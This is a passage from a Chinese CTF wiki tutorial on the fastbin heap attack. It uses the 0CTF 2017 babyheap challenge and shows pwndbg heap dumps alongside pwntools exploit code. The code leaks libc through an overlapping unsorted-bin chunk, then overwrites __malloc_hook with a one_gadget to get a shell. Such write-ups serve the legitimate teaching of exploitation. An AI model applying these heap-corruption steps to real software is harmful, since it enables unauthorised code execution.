<p>修改成功后如下</p>
<div class="codehilite"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021
0x55a03ca22010: 0x6161616161616161  0x6161616161616161
0x55a03ca22020: 0x0000000000000000  0x0000000000000021
0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg&gt; fastbins 
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</pre></div>

<p>那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># if we want to allocate at idx4, we must set it&#39;s size as 0x21</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
    <span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, which point to idx4&#39;s location</span>
</pre></div>

<p>之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2 也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># if want to free idx4 to unsorted bin, we must fix its size</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
    <span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1"># allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 5</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="c1"># as idx 2 point to idx4, just show this</span>
    <span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Content: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">main_arena</span> <span class="o">=</span> <span class="n">unsortedbin_addr</span> <span class="o">-</span> <span class="n">offset_unsortedbin_main_arena</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;main arena addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
    <span class="n">main_arena_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="n">main_arena_offset</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</pre></div>

<h4 id="chunkmalloc_hook">分配chunk到malloc_hook附近<a class="headerlink" href="#chunkmalloc_hook" title="Permanent link">&para;</a></h4>
<p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p>
<p><div class="codehilite"><pre><span></span><span class="c1"># 2. malloc to malloc_hook nearby</span>
<span class="c1"># allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># edit idx4&#39;s fd point to fake chunk</span>
<span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x33</span>
<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">),</span> <span class="n">fake_chunk</span><span class="p">)</span>

<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 4</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># idx 6</span>

<span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x13</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
<span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
<span class="c1"># trigger malloc_hook</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> 
</pre></div>
同时，这里的 onegadget 地址也可能需要尝试多次。</p>
<h2 id="_28">题目<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h2>
<ul>
<li>L-CTF2016–pwn200</li>
</ul>
<h2 id="_29">参考文献<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li>
<li><a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
<li><a href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a></li>
</ul>
                
                  
                
              
              
                
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../use_after_free/" title="Use After Free" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                Use After Free
              </span>
            </div>
          </a>
        
        
          <a href="../chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                Chunk Extend / Shrink
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.02434462.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
              
              
                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
              
            
          
          
        
      
      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
    
      
    
  </body>
</html>